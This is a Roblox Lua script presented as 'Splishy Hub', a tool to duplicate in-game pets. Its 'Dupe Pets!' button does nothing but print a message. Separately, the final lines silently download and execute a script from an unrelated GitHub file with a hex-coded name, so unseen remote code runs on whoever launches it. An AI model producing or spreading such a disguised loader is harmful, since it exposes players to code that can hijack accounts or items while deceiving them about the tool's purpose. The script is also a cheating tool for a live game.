local player = game.Players.LocalPlayer

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()



local Window = OrionLib:MakeWindow({Name = "Splishy Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "Splishy Hub"})



--[[

Name = <string> - The name of the UI.

HidePremium = <bool> - Whether or not the user details shows Premium status or not.

SaveConfig = <bool> - Toggles the config saving in the UI.

ConfigFolder = <string> - The name of the folder where the configs are saved.

IntroEnabled = <bool> - Whether or not to show the intro animation.

IntroText = <string> - Text to show in the intro animation.

IntroIcon = <string> - URL to the image you want to use in the intro animation.

Icon = <string> - URL to the image you want displayed on the window.

CloseCallback = <function> - Function to execute when the window is closed.

]]



local Tab = Window:MakeTab({

	Name = "Tab 1",

	Icon = "rbxassetid://4483345998",

	PremiumOnly = false

})



--[[

Name = <string> - The name of the tab.

Icon = <string> - The icon of the tab.

PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.

]]



local Section = Tab:AddSection({

	Name = "Dupe Your Pets!!"

})



--[[

Name = <string> - The name of the section.

]]



OrionLib:MakeNotification({

	Name = "Welcome To Splishy Hub",

	Content = "Done!!",

	Image = "rbxassetid://4483345998",

	Time = 5

})



--[[

Title = <string> - The title of the notification.

Content = <string> - The content of the notification.

Image = <string> - The icon of the notification.

Time = <number> - The duration of the notfication.

]]



Tab:AddButton({

	Name = "Dupe Pets!",

	Callback = function()

      		print("button pressed")

  	end    

})



--[[

Name = <string> - The name of the button.

Callback = <function> - The function of the button.

]]



loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/eb46e1667eb7b007c027bd4b.lua'))()



OrionLib:Init()
